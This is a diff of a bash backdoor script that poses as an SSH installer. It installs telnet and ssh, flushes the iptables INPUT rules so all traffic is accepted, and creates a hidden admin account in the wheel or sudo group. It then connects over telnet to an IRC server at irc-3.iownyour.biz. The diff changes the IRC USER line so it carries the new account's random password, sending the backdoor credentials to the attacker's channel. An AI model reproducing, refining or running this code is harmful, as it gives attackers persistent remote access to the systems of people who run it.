@@ -1,7 +1,9 @@
 #!/bin/bash
+random_number=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1);
+random_user=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1);
 server="irc-3.iownyour.biz"
 channel="help"
-user="r00tz hostname servername :is.gd/sshpwn"
+user="$random_number hostname servername :is.gd/sshpwn"
 echo Intalling SSH...;
 if [ -f /usr/bin/yum ]; then yum install telnet openssh* -y; fi;
 if [ -f /usr/bin/apt ]; then apt install telnet ssh -y; fi;
@@ -10,8 +12,6 @@ rm -rf input
 iptables -F INPUT;
 iptables -P INPUT ACCEPT;
 echo Adding new admin account...;
-random_number=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1);
-random_user=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1);
 useradd -m $random_user;
 echo $random_user:$random_number | chpasswd;
 if [ -f /usr/bin/yum ]; then usermod -aG wheel $random_user; fi;
@@ -27,25 +27,11 @@ echo "USER $user" >> input
 echo "JOIN #$channel" >> input
 tail -f input | telnet $server 6667 | while read; do
   set -- ${REPLY//$'\r'/}
-
-  # answer the critical ping request
-  # otherwise the server will disconnect us
   [ "$1" == "PING" ] && echo "PONG $2" >> input
-  
   if [ "$2" == "001" ] ; then
     echo $*
     echo "JOIN #$channel" >> input
   fi
-
-  if [ "$2" == "PRIVMSG" ] ; then
-    echo $*
-  fi
-
-  if [ "$2" == "JOIN" ] ; then
-    echo "PRIVMSG #$channel :$arr4y" >> input
-  fi
-
-
 done
 
 
